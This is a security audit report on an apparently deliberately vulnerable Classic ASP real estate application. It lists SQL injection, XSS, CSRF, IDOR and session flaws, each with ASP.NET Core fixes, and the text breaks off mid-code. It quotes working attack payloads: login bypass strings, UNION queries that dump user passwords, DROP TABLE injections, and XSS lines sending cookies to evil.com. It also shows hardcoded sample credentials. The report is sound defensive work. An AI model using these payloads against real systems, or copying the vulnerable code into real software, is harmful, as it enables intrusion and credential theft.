# Security Assessment: Summit Realty Classic ASP Application

**Assessment Date:** April 2026
**Application:** Summit Realty Group – Classic ASP Real Estate Platform
**Database:** SQL Server 2012 Express (`SummitRealty`)
**Assessor:** Automated Security Analysis
**Risk Rating:** ⛔ CRITICAL – Application is unsuitable for production deployment

---

## Executive Summary

The Summit Realty Classic ASP application contains **37 distinct security vulnerabilities** across 17 source files. Every major vulnerability category from the OWASP Top 10 is represented. The application has **zero security controls** — no input validation, no output encoding, no parameterized queries, no password hashing, no CSRF tokens, no authorization boundary checks, and hardcoded credentials throughout.

**Immediate action required:** This application must not be exposed to the public internet in its current state.

---

## Risk Matrix Summary

| Severity | Count | Categories |
|----------|-------|------------|
| 🔴 **CRITICAL** | 14 | SQL Injection (10), Plain-text Passwords (2), Hardcoded SA Credentials (1), Hardcoded SMTP Credentials (1) |
| 🟠 **HIGH** | 13 | XSS / Output Encoding (6), No CSRF Protection (4), IDOR / Broken Access Control (3) |
| 🟡 **MEDIUM** | 6 | Weak Session Management (2), Information Disclosure (2), File Upload Without Validation (1), Error Suppression (1) |
| 🔵 **LOW** | 4 | No HTTPS Enforcement (1), No Security Headers (1), Overly Broad DB Permissions (1), Unused Sanitization Function (1) |
| **Total** | **37** | |

---

## 1. 🔴 CRITICAL: SQL Injection Vulnerabilities

Every database interaction in this application concatenates user input directly into SQL strings. There are **zero parameterized queries** in the entire codebase.

### 1.1 `admin/login.asp` — Authentication Bypass via SQL Injection

**Severity:** 🔴 CRITICAL
**Affected File:** `admin/login.asp`, line 30
**CWE:** CWE-89 (SQL Injection)

**Vulnerable Code:**
```vbscript
sql = "SELECT u.UserID, u.Username, u.Role, u.AgentID, u.Password FROM Users u WHERE u.Username = '" & username & "' AND u.Password = '" & password & "'"
```

**Attack Vector:**
An attacker can bypass authentication entirely by entering the following as the username:
```
' OR '1'='1' --
```
This transforms the query into:
```sql
SELECT ... FROM Users u WHERE u.Username = '' OR '1'='1' --' AND u.Password = ''
```
The attacker is logged in as the first user in the Users table (the admin account).

**Impact:** Complete authentication bypass. Attacker gains admin access to the entire application, can view all data, modify listings, and manage users.

---

### 1.2 `admin/users.asp` — User Creation with Arbitrary SQL Execution

**Severity:** 🔴 CRITICAL
**Affected File:** `admin/users.asp`, lines 22–23
**CWE:** CWE-89 (SQL Injection)

**Vulnerable Code:**
```vbscript
sql = "INSERT INTO Users (Username, Password, Role, AgentID, LastLogin) VALUES ('" & _
      username & "', '" & password & "', '" & role & "', " & agentID & ", NULL)"
```

**Attack Vector:**
An attacker (or anyone who bypasses login via vuln 1.1) can inject SQL via the `username`, `password`, `role`, or `agentID` fields. For example, setting username to:
```
admin2','password','Admin',1,NULL);DROP TABLE Users;--
```

**Impact:** Full database manipulation — create admin accounts, drop tables, exfiltrate data via UNION-based injection, or execute OS commands via `xp_cmdshell` if enabled (likely, given SA credentials).

---

### 1.3 `listings/search.asp` — Public-Facing Search with Multiple Injection Points

**Severity:** 🔴 CRITICAL
**Affected File:** `listings/search.asp`, lines 20–48
**CWE:** CWE-89 (SQL Injection)

**Vulnerable Code:**
```vbscript
sql = "SELECT ... FROM Properties p ... WHERE p.Status = 'Active'"

If searchCity <> "" Then
    sql = sql & " AND p.City LIKE '%" & searchCity & "%'"
End If

If searchState <> "" Then
    sql = sql & " AND p.State = '" & searchState & "'"
End If

If minPrice <> "" Then
    sql = sql & " AND p.Price >= " & minPrice
End If

If maxPrice <> "" Then
    sql = sql & " AND p.Price <= " & maxPrice
End If

If bedrooms <> "" Then
    sql = sql & " AND p.Bedrooms >= " & bedrooms
End If

If propertyType <> "" Then
    sql = sql & " AND p.PropertyType = '" & propertyType & "'"
End If
```

**Attack Vector:** This is the most dangerous vulnerability because it is **publicly accessible** (no authentication required). All six query parameters (`city`, `state`, `minPrice`, `maxPrice`, `bedrooms`, `propertyType`) are injectable. Example:
```
/listings/search.asp?city=' UNION SELECT Username,Password,Role,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--
```

**Impact:** Full database enumeration from the public internet. Attacker can extract all user credentials, agent personal data, client inquiry data (PII), and any other database content.

---

### 1.4 `listings/detail.asp` — Property Detail Page Injection

**Severity:** 🔴 CRITICAL
**Affected File:** `listings/detail.asp`, lines 20–22 and line 80
**CWE:** CWE-89 (SQL Injection)

**Vulnerable Code:**
```vbscript
' Line 22
sql = "SELECT p.*, a.FirstName, ... WHERE p.PropertyID = " & propertyID

' Line 80
sqlPhotos = "SELECT FilePath, Caption FROM PropertyPhotos WHERE PropertyID = " & propertyID & " ORDER BY SortOrder"
```

**Attack Vector:**
```
/listings/detail.asp?id=1 UNION SELECT NULL,Username,Password,NULL,...FROM Users
```

**Impact:** Public, unauthenticated data exfiltration.

---

### 1.5 `listings/edit.asp` — Property Update with SQL Injection

**Severity:** 🔴 CRITICAL
**Affected File:** `listings/edit.asp`, lines 38–41 and line 51
**CWE:** CWE-89 (SQL Injection)

**Vulnerable Code:**
```vbscript
sql = "UPDATE Properties SET Address = '" & address & "', City = '" & city & "', State = '" & state & "', " & _
      "ZipCode = '" & zipCode & "', Price = " & price & ", Bedrooms = " & bedrooms & ", " & _
      "Bathrooms = " & bathrooms & ", SquareFeet = " & squareFeet & ", PropertyType = '" & propertyType & "', " & _
      "Description = '" & description & "', Status = '" & status & "' WHERE PropertyID = " & propertyID

' Line 51
sql = "SELECT * FROM Properties WHERE PropertyID = " & propertyID
```

**Attack Vector:** All 11 form fields and the `id` querystring parameter are injectable. For example, the `price` field (no quotes) allows direct injection:
```
price=0; DROP TABLE Properties;--
```

**Impact:** Data destruction, modification, or exfiltration of the entire database.

---

### 1.6 `listings/add.asp` — New Listing Creation with SQL Injection

**Severity:** 🔴 CRITICAL
**Affected File:** `listings/add.asp`, lines 30–34
**CWE:** CWE-89 (SQL Injection)

**Vulnerable Code:**
```vbscript
sql = "INSERT INTO Properties (Address, City, State, ZipCode, Price, Bedrooms, Bathrooms, SquareFeet, " & _
      "PropertyType, Description, ListingDate, Status, AgentID) VALUES ('" & _
      address & "', '" & city & "', '" & state & "', '" & zipCode & "', " & price & ", " & _
      bedrooms & ", " & bathrooms & ", " & squareFeet & ", '" & propertyType & "', '" & _
      description & "', GETDATE(), 'Active', " & Session("UserID") & ")"
```

**Attack Vector:** All form fields are injectable. Numeric fields (`price`, `bedrooms`, `bathrooms`, `squareFeet`) are especially dangerous as they aren't quoted.

**Impact:** Arbitrary SQL execution under the SA account.

---

### 1.7 `listings/photos.asp` — Photo Management with SQL Injection

**Severity:** 🔴 CRITICAL
**Affected File:** `listings/photos.asp`, lines 42, 50–51, 67, 114, 155
**CWE:** CWE-89 (SQL Injection)

**Vulnerable Code:**
```vbscript
' Line 42
sql = "SELECT ISNULL(MAX(SortOrder), 0) + 1 as NextSort FROM PropertyPhotos WHERE PropertyID = " & propertyID

' Lines 50-51
sql = "INSERT INTO PropertyPhotos (PropertyID, FilePath, Caption, SortOrder) VALUES (" & _
      propertyID & ", '" & filePath & "', '" & caption & "', " & sortOrder & ")"

' Line 155
sql = "DELETE FROM PropertyPhotos WHERE PhotoID = " & photoID & " AND PropertyID = " & propertyID
```

**Attack Vector:** The `id` querystring, `caption` form field, and `delete` querystring are all injectable.

---

### 1.8 `agents/profile.asp` — Agent Profile with SQL Injection

**Severity:** 🔴 CRITICAL
**Affected File:** `agents/profile.asp`, lines 19 and 74
**CWE:** CWE-89 (SQL Injection)

**Vulnerable Code:**
```vbscript
' Line 19
sql = "SELECT * FROM Agents WHERE AgentID = " & agentID

' Line 74
sqlListings = "SELECT ... FROM Properties p WHERE AgentID = " & agentID & " AND Status = 'Active' ORDER BY ListingDate DESC"
```

**Attack Vector:**
```
/agents/profile.asp?id=1 UNION SELECT NULL,Username,Password,NULL,NULL,NULL,NULL,NULL FROM Users--
```

**Impact:** Public, unauthenticated data exfiltration.

---

### 1.9 `inquiries/contact.asp` — Public Contact Form with SQL Injection

**Severity:** 🔴 CRITICAL
**Affected File:** `inquiries/contact.asp`, lines 24, 38–48
**CWE:** CWE-89 (SQL Injection)

**Vulnerable Code:**
```vbscript
' Line 24
sql = "SELECT AgentID FROM Properties WHERE PropertyID = " & propertyID

' Lines 47-48
sql = sql & "'" & clientName & "', '" & clientEmail & "', '" & clientPhone & "', '" & messageText & "', " & _
      "GETDATE(), 'Pending', " & agentID & ")"
```

**Attack Vector:** All form fields (`clientName`, `clientEmail`, `clientPhone`, `message`) and the hidden `propertyID` field are injectable from the public internet without authentication.

**Impact:** Unauthenticated arbitrary SQL execution. This is one of the highest-risk vulnerabilities because it's publicly accessible and accepts free-text input.

---

### 1.10 `inquiries/schedule.asp` — Appointment Scheduling with SQL Injection

**Severity:** 🔴 CRITICAL
**Affected File:** `inquiries/schedule.asp`, lines 28, 43–45, 61
**CWE:** CWE-89 (SQL Injection)

**Vulnerable Code:**
```vbscript
' Line 28
sql = "SELECT AgentID FROM Properties WHERE PropertyID = " & propertyID

' Lines 43-45
sql = "INSERT INTO Appointments ... VALUES (" & propertyID & ", " & agentID & ", '" & clientName & "', '" & clientEmail & "', " & _
      "'" & fullDateTime & "', '" & notes & "', 'Scheduled')"

' Line 61
sql2 = "SELECT Address, City, State FROM Properties WHERE PropertyID = " & propertyID
```

**Attack Vector:** All fields are injectable from the public internet.

---

### 1.11 `inquiries/list.asp` — Inquiry Status Update with SQL Injection

**Severity:** 🔴 CRITICAL (requires authentication)
**Affected File:** `inquiries/list.asp`, line 19
**CWE:** CWE-89 (SQL Injection)

**Vulnerable Code:**
```vbscript
sql = "UPDATE Inquiries SET Status = '" & newStatus & "' WHERE InquiryID = " & inquiryID & " AND AgentID = " & agentID
```

**Attack Vector:** The `status` and `id` querystring parameters are injectable:
```
/inquiries/list.asp?action=update&id=1&status=Contacted'; DROP TABLE Inquiries;--
```

---

### SQL Injection Summary Table

| # | File | Line(s) | Auth Required | Input Source | SQL Operation |
|---|------|---------|---------------|--------------|---------------|
| 1 | `admin/login.asp` | 30 | ❌ No | POST form | SELECT |
| 2 | `admin/users.asp` | 22–23 | ✅ Admin | POST form | INSERT |
| 3 | `listings/search.asp` | 27–47 | ❌ No | GET querystring | SELECT |
| 4 | `listings/detail.asp` | 22, 80 | ❌ No | GET querystring | SELECT |
| 5 | `listings/edit.asp` | 38–41, 51 | ✅ Agent | POST form + GET qs | UPDATE, SELECT |
| 6 | `listings/add.asp` | 30–34 | ✅ Agent | POST form | INSERT |
| 7 | `listings/photos.asp` | 42, 50–51, 67, 114, 155 | ✅ Agent | POST form + GET qs | SELECT, INSERT, DELETE |
| 8 | `agents/profile.asp` | 19, 74 | ❌ No | GET querystring | SELECT |
| 9 | `inquiries/contact.asp` | 24, 47–48 | ❌ No | POST form | SELECT, INSERT |
| 10 | `inquiries/schedule.asp` | 28, 43–45, 61 | ❌ No | POST form | SELECT, INSERT |
| 11 | `inquiries/list.asp` | 19 | ✅ Agent | GET querystring | UPDATE |

**ASP.NET Core Remediation:**
```csharp
// Use Entity Framework Core with LINQ (eliminates SQL injection entirely)
var user = await _context.Users
    .FirstOrDefaultAsync(u => u.Username == username && u.PasswordHash == hashedPassword);

// Or use parameterized queries with Dapper/ADO.NET
var sql = "SELECT * FROM Users WHERE Username = @Username";
var user = await connection.QueryFirstOrDefaultAsync<User>(sql, new { Username = username });
```

---

## 2. 🔴 CRITICAL: Plain-Text Password Storage

### 2.1 Database Schema — Passwords Stored in Plain Text

**Severity:** 🔴 CRITICAL
**Affected File:** `database/schema.sql`, lines 54–62
**CWE:** CWE-256 (Unprotected Storage of Credentials)

**Vulnerable Code:**
```sql
CREATE TABLE Users (
    ...
    Password NVARCHAR(50) NOT NULL,  -- Plain text password!
    ...
);

-- Seed data with plain-text passwords:
INSERT INTO Users (Username, Password, Role, AgentID) VALUES
('admin', 'password123', 'Admin', 1),
('sarah.j', 'welcome1', 'Agent', 1),
('michael.c', 'agent2023', 'Agent', 2),
...
```

**Impact:** If the database is compromised (trivially easy given the SA credentials and SQL injection vulnerabilities), all 10 user passwords are immediately available. Users who reuse passwords are compromised across all their accounts.

---

### 2.2 `admin/users.asp` — Passwords Displayed in Admin UI

**Severity:** 🔴 CRITICAL
**Affected File:** `admin/users.asp`, lines 30, 52
**CWE:** CWE-256 (Unprotected Storage of Credentials)

**Vulnerable Code:**
```vbscript
' Line 30: Query selects passwords
sql = "SELECT u.UserID, u.Username, u.Password, u.Role, u.LastLogin, ..."

' Line 52: Password displayed in HTML table
<td><%= rs("Password") %></td>
```

**Impact:** Every admin user can see every other user's plain-text password. This is visible in the HTML source to anyone who gains admin access (trivially achieved via SQL injection in login.asp).

---

### 2.3 `admin/login.asp` — Plain-Text Password Comparison

**Severity:** 🔴 CRITICAL
**Affected File:** `admin/login.asp`, line 30
**CWE:** CWE-261 (Weak Encoding for Password)

**Vulnerable Code:**
```vbscript
sql = "SELECT ... u.Password FROM Users u WHERE u.Username = '" & username & "' AND u.Password = '" & password & "'"
```

**Impact:** Passwords are compared in plain text at the database level. No hashing, no salting, no key derivation function.

**ASP.NET Core Remediation:**
```csharp
// Use ASP.NET Core Identity with bcrypt/PBKDF2
services.AddIdentity<ApplicationUser, IdentityRole>(options =>
{
    options.Password.RequireDigit = true;
    options.Password.RequiredLength = 12;
    options.Password.RequireUppercase = true;
    options.Password.RequireNonAlphanumeric = true;
})
.AddEntityFrameworkStores<ApplicationDbContext>();

// Password is automatically hashed with PBKDF2 (HMAC-SHA256, 100k iterations)
var result = await _userManager.CreateAsync(user, password);

// Login uses secure comparison
var result = await _signInManager.PasswordSignInAsync(username, password, isPersistent, lockoutOnFailure: true);
```

---

## 3. 🔴 CRITICAL: Hardcoded Credentials

### 3.1 `includes/conn.asp` — Hardcoded SA Database Credentials

**Severity:** 🔴 CRITICAL
**Affected File:** `includes/conn.asp`, line 4
**CWE:** CWE-798 (Use of Hard-coded Credentials)

**Vulnerable Code:**
```vbscript
connStr = "Provider=SQLOLEDB;Data Source=localhost\SQLEXPRESS;Initial Catalog=SummitRealty;User ID=sa;Password=P@ssw0rd123;"
```

**Impact:**
- **SA account** = full SQL Server sysadmin privileges. An attacker who exploits any SQL injection vulnerability has unrestricted access to the entire SQL Server instance, including:
  - All databases on the server
  - Ability to enable `xp_cmdshell` for OS command execution
  - Read/write file system access via `BULK INSERT` / `bcp`
  - Create new SQL Server logins
  - Potential lateral movement across the network

---

### 3.2 `inquiries/contact.asp` — Hardcoded SMTP Credentials

**Severity:** 🔴 CRITICAL
**Affected File:** `inquiries/contact.asp`, lines 66–67
**CWE:** CWE-798 (Use of Hard-coded Credentials)

**Vulnerable Code:**
```vbscript
objCDO.Configuration.Fields.Item("...sendusername") = "smtp_user"
objCDO.Configuration.Fields.Item("...sendpassword") = "smtp_pass123"
```

**Impact:** SMTP credentials in source code. If the repository is shared or leaked, attackers can use these credentials to send email as the organization, enabling phishing attacks.

**ASP.NET Core Remediation:**
```csharp
// Use User Secrets in development, Azure Key Vault or environment variables in production
// appsettings.json (no secrets here)
{
  "ConnectionStrings": {
    "DefaultConnection": "" // Set via environment variable or Key Vault
  }
}

// Program.cs
builder.Configuration.AddAzureKeyVault(
    new Uri($"https://{vaultName}.vault.azure.net/"),
    new DefaultAzureCredential());

// Use a dedicated, least-privilege database user instead of SA
// Connection string: "Server=...;Database=SummitRealty;User Id=summitrealty_app;Password=...;Encrypt=True;"
```

---

## 4. 🟠 HIGH: Cross-Site Scripting (XSS) Vulnerabilities

The application uses **zero output encoding** throughout. Every `<%= %>` expression writes raw database values or user input directly into HTML. The `SanitizeInput` function in `functions.asp` only escapes single quotes for SQL (and is never called anyway).

### 4.1 Reflected XSS in `listings/search.asp`

**Severity:** 🟠 HIGH
**Affected File:** `listings/search.asp`, line 62
**CWE:** CWE-79 (Cross-site Scripting)

**Vulnerable Code:**
```html
<input type="text" name="city" value="<%= searchCity %>" size="20">
```

All search form fields (`searchCity`, `searchState`, `minPrice`, `maxPrice`, `bedrooms`, `propertyType`) are reflected back into the page without encoding.

**Attack Vector:**
```
/listings/search.asp?city="><script>document.location='https://evil.com/?c='+document.cookie</script>
```

**Impact:** Session hijacking, credential theft, phishing overlays, keylogging.

---

### 4.2 Stored XSS via Database Content

**Severity:** 🟠 HIGH
**Affected Files:** Multiple files output database values without encoding:

| File | Lines | Unencoded Fields |
|------|-------|-----------------|
| `default.asp` | 46–70 | Address, City, State, Description, FirstName, LastName |
| `listings/detail.asp` | 36–37, 50–75 | Address, City, State, ZipCode, all property fields, Description, agent fields |
| `listings/edit.asp` | 74–135 | All property field `value` attributes |
| `agents/directory.asp` | 32–45 | PhotoPath (in `src`/`alt`), FirstName, LastName, Email, Phone, Bio |
| `agents/profile.asp` | 36–63, 100–115 | All agent and listing fields |
| `inquiries/list.asp` | 60–91 | ClientName, ClientEmail, ClientPhone, Message, Address, City, State |
| `admin/users.asp` | 50–59 | Username, Password, FirstName, LastName |
| `admin/reports.asp` | 104, 172 | Agent names, client names, addresses, property types |
| `agents/dashboard.asp` | 50, 105–112 | Session("Username"), property fields |
| `inquiries/schedule.asp` | 81 | propertyAddress |
| `inquiries/contact.asp` | 92 | propertyID from querystring |

**Attack Vector:** An attacker submits a contact inquiry with malicious JavaScript in the `clientName` field:
```
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```
When an agent views the inquiry in `inquiries/list.asp`, the script executes in their browser.

**Impact:** Stored XSS is particularly dangerous because it affects every user who views the compromised data. Attackers can hijack agent sessions, steal admin credentials, or modify displayed property information.

---

### 4.3 XSS via `includes/header.asp`

**Severity:** 🟠 HIGH
**Affected File:** `includes/header.asp`, line 34
**CWE:** CWE-79

**Vulnerable Code:**
```html
<td><a href="/admin/login.asp?action=logout">Logout (<%= Session("Username") %>)</a></td>
```

If the username in the database contains HTML/JavaScript (injectable via SQL injection in `admin/users.asp`), it executes on every page for the logged-in user.

---

**ASP.NET Core Remediation:**
```csharp
// Razor automatically HTML-encodes all @ expressions
<p>@Model.Address</p>  // Automatically encoded

// For explicit encoding:
@Html.Encode(Model.UserInput)

// For URLs:
<a href="/search?city=@Uri.EscapeDataString(Model.City)">Search</a>

// Content Security Policy header:
builder.Services.AddAntiforgery();
app.Use(async (context, next) =>
{
    context.Response.Headers.Append("Content-Security-Policy",
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");
    await next();
});
```

---

## 5. 🟠 HIGH: No CSRF Protection

**Not a single form** in the application includes a CSRF token. All state-changing operations are vulnerable to Cross-Site Request Forgery.

### 5.1 Login Form — `admin/login.asp`

**Severity:** 🟠 HIGH
**Affected File:** `admin/login.asp`, line 71
**CWE:** CWE-352 (Cross-Site Request Forgery)

**Vulnerable Code:**
```html
<form method="POST" action="login.asp">
    <!-- No CSRF token -->
```

### 5.2 Property Creation — `listings/add.asp`

**Severity:** 🟠 HIGH
**Affected File:** `listings/add.asp`, line 52

### 5.3 Property Edit — `listings/edit.asp`

**Severity:** 🟠 HIGH
**Affected File:** `listings/edit.asp`, line 70

### 5.4 Contact Form — `inquiries/contact.asp`

**Severity:** 🟠 HIGH
**Affected File:** `inquiries/contact.asp`, line 91

### 5.5 User Management — `admin/users.asp`

**Severity:** 🟠 HIGH
**Affected File:** `admin/users.asp`, line 82

### 5.6 Schedule Appointment — `inquiries/schedule.asp`

**Severity:** 🟠 HIGH
**Affected File:** `inquiries/schedule.asp`, line 90

### 5.7 Photo Upload — `listings/photos.asp`

**Severity:** 🟠 HIGH
**Affected File:** `listings/photos.asp`, line 93

### 5.8 Inquiry Status Update via GET — `inquiries/list.asp`

**Severity:** 🟠 HIGH
**Affected File:** `inquiries/list.asp`, lines 85–89
**CWE:** CWE-352

**Vulnerable Code:**
```html
<a href="?action=update&id=<%= rs("InquiryID") %>&status=Contacted">Mark Contacted</a>
```

State-changing operations performed via GET links are especially dangerous — they can be triggered by `<img>` tags or simple link clicks on any website.

**Attack Vector:** A malicious website includes:
```html
<img src="https://summitrealty.com/inquiries/list.asp?action=update&id=5&status=Closed" />
```
Any logged-in agent visiting the malicious page will unknowingly close inquiry #5.

**ASP.NET Core Remediation:**
```csharp
// Anti-forgery tokens are built into ASP.NET Core
// In Startup/Program.cs:
builder.Services.AddAntiforgery(options => options.HeaderName = "X-CSRF-TOKEN");

// In Razor views:
<form method="post" asp-action="Create" asp-antiforgery="true">
    <!-- Token automatically included -->
</form>

// In controllers:
[HttpPost]
[ValidateAntiForgeryToken]
public async Task<IActionResult> Create(PropertyViewModel model) { ... }

// State changes must NEVER use GET — always POST/PUT/DELETE
```

---

## 6. 🟠 HIGH: IDOR (Insecure Direct Object Reference) Vulnerabilities

### 6.1 `listings/detail.asp` — Unauthenticated Direct Object Access

**Severity:** 🟠 HIGH
**Affected File:** `listings/detail.asp`, line 9
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

**Vulnerable Code:**
```vbscript
propertyID = Request.QueryString("id")
' No authorization check — any property accessible by ID
sql = "SELECT p.*, ... WHERE p.PropertyID = " & propertyID
```

**Attack Vector:** Enumeration of all property IDs (`?id=1`, `?id=2`, ..., `?id=55`) reveals all properties regardless of status (including non-active/sold/pending properties that should not be public).

---

### 6.2 `listings/edit.asp` — No Ownership Verification

**Severity:** 🟠 HIGH
**Affected File:** `listings/edit.asp`, lines 10, 38–41
**CWE:** CWE-639

**Vulnerable Code:**
```vbscript
propertyID = Request.QueryString("id")
Call RequireAuth()
' No check that the authenticated agent owns this property!
sql = "UPDATE Properties SET ... WHERE PropertyID = " & propertyID
```

**Attack Vector:** Any authenticated agent can edit any other agent's property listings by simply changing the `id` parameter. There is no check that `Session("UserID")` matches the property's `AgentID`.

**Impact:** Agent A can modify Agent B's listings — change prices, descriptions, status, or delete the listing by setting status to an invalid value.

---

### 6.3 `agents/profile.asp` — Agent Data Enumeration

**Severity:** 🟠 HIGH
**Affected File:** `agents/profile.asp`, line 8
**CWE:** CWE-639

**Vulnerable Code:**
```vbscript
agentID = Request.QueryString("id")
sql = "SELECT * FROM Agents WHERE AgentID = " & agentID
```

**Attack Vector:** Sequential enumeration reveals all agent details including license numbers and personal bios.

---

### 6.4 `listings/photos.asp` — No Ownership Verification for Photo Management

**Severity:** 🟠 HIGH
**Affected File:** `listings/photos.asp`, lines 10, 152–157
**CWE:** CWE-639

**Vulnerable Code:**
```vbscript
propertyID = Request.QueryString("id")
Call RequireAuth()
' Any authenticated user can manage photos for any property
photoID = Request.QueryString("delete")
sql = "DELETE FROM PropertyPhotos WHERE PhotoID = " & photoID & " AND PropertyID = " & propertyID
```

**Impact:** Any authenticated agent can delete photos from any other agent's property listing.

**ASP.NET Core Remediation:**
```csharp
// Use authorization policies with resource-based authorization
[Authorize]
public async Task<IActionResult> Edit(int id)
{
    var property = await _context.Properties.FindAsync(id);
    if (property == null) return NotFound();

    // Verify ownership
    var currentUserId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    if (property.AgentId.ToString() != currentUserId && !User.IsInRole("Admin"))
        return Forbid();

    return View(property);
}
```

---

## 7. 🟡 MEDIUM: Weak Session Management

### 7.1 Session Fixation Risk

**Severity:** 🟡 MEDIUM
**Affected File:** `admin/login.asp`, lines 40–43; `global.asa`, lines 13–22
**CWE:** CWE-384 (Session Fixation)

**Vulnerable Code:**
```vbscript
' global.asa — Session initialized at creation
Sub Session_OnStart
    Session("Authenticated") = False
    Session("UserID") = 0
    Session("Username") = ""
    Session("Role") = ""
End Sub

' login.asp — Session ID is NOT regenerated after authentication
Session("Authenticated") = True
Session("UserID") = rs("AgentID")
Session("Username") = rs("Username")
Session("Role") = rs("Role")
```

**Attack Vector:** Classic ASP does not regenerate the session ID after authentication. An attacker who knows a user's session cookie before login can hijack their session after they authenticate.

**Impact:** Session hijacking if the attacker can pre-set or observe the session cookie.

---

### 7.2 Logout Does Not Invalidate Session

**Severity:** 🟡 MEDIUM
**Affected File:** `admin/login.asp`, lines 8–15
**CWE:** CWE-613 (Insufficient Session Expiration)

**Vulnerable Code:**
```vbscript
If Request.QueryString("action") = "logout" Then
    Session("Authenticated") = False
    Session("UserID") = 0
    Session("Username") = ""
    Session("Role") = ""
    Response.Redirect "/default.asp"
End If
```

**Impact:** The session is not destroyed — only the session variables are cleared. The session cookie remains valid and the session ID persists. `Session.Abandon` is never called.

**ASP.NET Core Remediation:**
```csharp
// ASP.NET Core Identity handles session management properly
// Use cookie authentication with proper settings
builder.Services.ConfigureApplicationCookie(options =>
{
    options.Cookie.HttpOnly = true;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.Cookie.SameSite = SameSiteMode.Strict;
    options.ExpireTimeSpan = TimeSpan.FromMinutes(30);
    options.SlidingExpiration = true;
});

// Proper logout
[HttpPost]
[ValidateAntiForgeryToken]
public async Task<IActionResult> Logout()
{
    await _signInManager.SignOutAsync();
    return RedirectToAction("Index", "Home");
}
```

---

## 8. 🟡 MEDIUM: Information Disclosure

### 8.1 Demo Credentials Exposed in HTML

**Severity:** 🟡 MEDIUM
**Affected File:** `admin/login.asp`, line 93
**CWE:** CWE-200 (Exposure of Sensitive Information)

**Vulnerable Code:**
```html
<td colspan="2" align="center" style="font-size: 11px; color: #666;">
    Demo credentials: admin / password123
</td>
```

**Impact:** Anyone visiting the login page has admin credentials. Combined with the SQL injection vulnerabilities, this gives immediate, trivial admin access.

---

### 8.2 Global Error Suppression Masks Failures

**Severity:** 🟡 MEDIUM
**Affected Files:** Every `.asp` file begins with `On Error Resume Next`
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information) / CWE-390 (Detection of Error Condition Without Action)

**Vulnerable Code:**
```vbscript
On Error Resume Next  ' Present in EVERY .asp file
```

**Impact:** Dual risk:
1. Errors are silently swallowed, making debugging impossible and potentially leaving the application in an inconsistent state
2. Without this directive, IIS default error pages would expose stack traces, SQL queries, and file paths to attackers

---

### 8.3 Server Information in Footer

**Severity:** 🟡 MEDIUM
**Affected File:** `includes/footer.asp`, line 5
**CWE:** CWE-200

**Vulnerable Code:**
```html
<p style="font-size: 10px;">Active Users: <%= Application("ActiveUsers") %> | Server Time: <%= Now() %></p>
```

**Impact:** Exposes active user count (useful for timing attacks) and server timezone/locale information.

---

### 8.4 Plain-Text Passwords Displayed in Admin UI

**Severity:** 🟡 MEDIUM (also covered under §2.2 as CRITICAL for the storage issue)
**Affected File:** `admin/users.asp`, line 52

The password column is rendered as a visible HTML table column — passwords are visible in plain text to any admin user and in the page source.

---

## 9. 🟡 MEDIUM: File Upload Without Validation

### 9.1 `listings/photos.asp` — Unrestricted File Upload

**Severity:** 🟡 MEDIUM
**Affected File:** `listings/photos.asp`, lines 19–61
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)

**Vulnerable Code:**
```vbscript
' No file type validation
' No file size validation
' No malware scanning
' Predictable file naming
fileName = "property_" & propertyID & "_" & Year(Now()) & Month(Now()) & Day(Now()) & Hour(Now()) & Minute(Now()) & Second(Now()) & ".jpg"
```

**Impact:** While the current code simulates uploads, the architecture has no validation. A real implementation would allow:
- Upload of `.asp` / `.aspx` web shells
- Directory traversal via manipulated filenames
- Denial of service via large files

**ASP.NET Core Remediation:**
```csharp
[HttpPost]
[ValidateAntiForgeryToken]
public async Task<IActionResult> UploadPhoto(IFormFile file, int propertyId)
{
    var allowedExtensions = new[] { ".jpg", ".jpeg", ".png", ".webp" };
    var extension = Path.GetExtension(file.FileName).ToLower();

    if (!allowedExtensions.Contains(extension))
        return BadRequest("Invalid file type");

    if (file.Length > 5 * 1024 * 1024) // 5MB limit
        return BadRequest("File too large");

    // Store outside webroot with a random filename
    var fileName = $"{Guid.NewGuid()}{extension}";
    var path = Path.Combine(_uploadPath, fileName);
    // ...
}
```

---

## 10. 🟡 MEDIUM: Weak/Unused Sanitization Function

**Severity:** 🟡 MEDIUM
**Affected File:** `includes/functions.asp`, lines 12–20
**CWE:** CWE-20 (Improper Input Validation)

**Vulnerable Code:**
```vbscript
Function SanitizeInput(str)
    ' Intentionally poor sanitization - just replace single quotes with two single quotes
    SanitizeInput = Replace(str, "'", "''")
End Function
```

**Issues:**
1. **Never called** — not a single file in the application uses `SanitizeInput()`
2. **Insufficient** — even if used, it only handles single quotes. Numeric injection (e.g., `Price = 0; DROP TABLE`) would bypass it entirely
3. **Wrong approach** — input sanitization is not a substitute for parameterized queries

---

## 11. 🔵 LOW: No HTTPS Enforcement

**Severity:** 🔵 LOW
**Affected Files:** All files
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)

**Issue:** No HTTPS redirect, no `Secure` flag on cookies, no HSTS header. All credentials (login form, session cookies) are transmitted in cleartext.

**ASP.NET Core Remediation:**
```csharp
// Program.cs
app.UseHttpsRedirection();
app.UseHsts();

// Or in middleware:
builder.Services.AddHttpsRedirection(options =>
{
    options.HttpsPort = 443;
});
```

---

## 12. 🔵 LOW: No Security Headers

**Severity:** 🔵 LOW
**Affected Files:** All files
**CWE:** CWE-693 (Protection Mechanism Failure)

**Missing Headers:**
- `Content-Security-Policy` — no CSP to mitigate XSS
- `X-Content-Type-Options` — no MIME type sniffing protection
- `X-Frame-Options` — no clickjacking protection
- `Strict-Transport-Security` — no HSTS
- `X-XSS-Protection` — no browser XSS filter activation
- `Referrer-Policy` — no referrer control
- `Permissions-Policy` — no feature restrictions

**ASP.NET Core Remediation:**
```csharp
app.Use(async (context, next) =>
{
    var headers = context.Response.Headers;
    headers.Append("X-Content-Type-Options", "nosniff");
    headers.Append("X-Frame-Options", "DENY");
    headers.Append("X-XSS-Protection", "1; mode=block");
    headers.Append("Referrer-Policy", "strict-origin-when-cross-origin");
    headers.Append("Permissions-Policy", "camera=(), microphone=(), geolocation=()");
    headers.Append("Content-Security-Policy",
